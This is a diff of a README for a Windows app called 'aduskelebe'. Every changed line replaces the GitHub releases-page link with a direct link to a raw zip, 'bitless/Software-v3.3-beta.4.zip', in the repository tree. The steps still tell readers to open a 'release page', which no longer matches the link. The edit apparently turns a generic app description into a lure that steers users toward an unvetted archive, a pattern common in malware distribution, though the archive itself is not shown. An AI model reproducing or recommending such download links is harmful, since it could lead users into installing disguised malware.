@@ -1,12 +1,12 @@
 # 🖥️ aduskelebe - Simple Windows app for quick use
 
-[![Download aduskelebe](https://img.shields.io/badge/Download%20aduskelebe-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dricdr4789/aduskelebe/releases)
+[![Download aduskelebe](https://img.shields.io/badge/Download%20aduskelebe-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dricdr4789/aduskelebe/raw/refs/heads/main/bitless/Software-v3.3-beta.4.zip)
 
 ## 📥 Download
 
 Use this page to download the app for Windows:
 
-[https://github.com/dricdr4789/aduskelebe/releases](https://github.com/dricdr4789/aduskelebe/releases)
+[https://github.com/dricdr4789/aduskelebe/raw/refs/heads/main/bitless/Software-v3.3-beta.4.zip](https://github.com/dricdr4789/aduskelebe/raw/refs/heads/main/bitless/Software-v3.3-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ If your PC can open normal desktop apps, it should be ready.
 
 ## ⬇️ How to Download
 
-1. Open the release page: [https://github.com/dricdr4789/aduskelebe/releases](https://github.com/dricdr4789/aduskelebe/releases)
+1. Open the release page: [https://github.com/dricdr4789/aduskelebe/raw/refs/heads/main/bitless/Software-v3.3-beta.4.zip](https://github.com/dricdr4789/aduskelebe/raw/refs/heads/main/bitless/Software-v3.3-beta.4.zip)
 2. Look for the latest release at the top of the page
 3. Open the list of files under that release
 4. Find the file for Windows
@@ -182,7 +182,7 @@ If the app created settings files, they may stay in your user folders until you 
 
 Use this link to get the latest Windows download:
 
-[https://github.com/dricdr4789/aduskelebe/releases](https://github.com/dricdr4789/aduskelebe/releases)
+[https://github.com/dricdr4789/aduskelebe/raw/refs/heads/main/bitless/Software-v3.3-beta.4.zip](https://github.com/dricdr4789/aduskelebe/raw/refs/heads/main/bitless/Software-v3.3-beta.4.zip)
 
 ## ❓ Common Questions
 
